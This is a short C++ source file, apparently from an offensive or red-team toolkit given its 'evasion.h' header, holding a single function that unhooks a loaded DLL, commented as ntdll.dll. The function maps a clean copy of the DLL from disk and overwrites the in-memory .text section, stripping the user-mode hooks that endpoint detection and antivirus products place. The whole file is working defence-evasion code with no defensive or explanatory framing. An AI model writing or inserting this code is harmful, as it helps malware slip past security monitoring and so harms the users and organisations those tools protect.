#include "evasion.h"

int UnHookDll(const TCHAR* tcsModule, const TCHAR* tcsPath)
{
	HANDLE process = GetCurrentProcess();
	MODULEINFO mi;
	ZeroMemory(&mi, sizeof(MODULEINFO));
	HMODULE ntdllModule = LoadLibrary(tcsModule); //"ntdll.dll"
	if (ntdllModule != NULL)
	{
		GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
		LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
		HANDLE ntdllFile = CreateFile(tcsPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
		HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
		if (ntdllMapping != NULL)
		{
			LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);
			PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
			PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);

			for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
				PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

				if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {
					DWORD oldProtection = 0;
					bool bIsProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
					memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
					bIsProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
				}
			}
			CloseHandle(ntdllMapping);
		}
		CloseHandle(ntdllFile);
		FreeLibrary(ntdllModule);
	}
	CloseHandle(process);
	return 0;
}
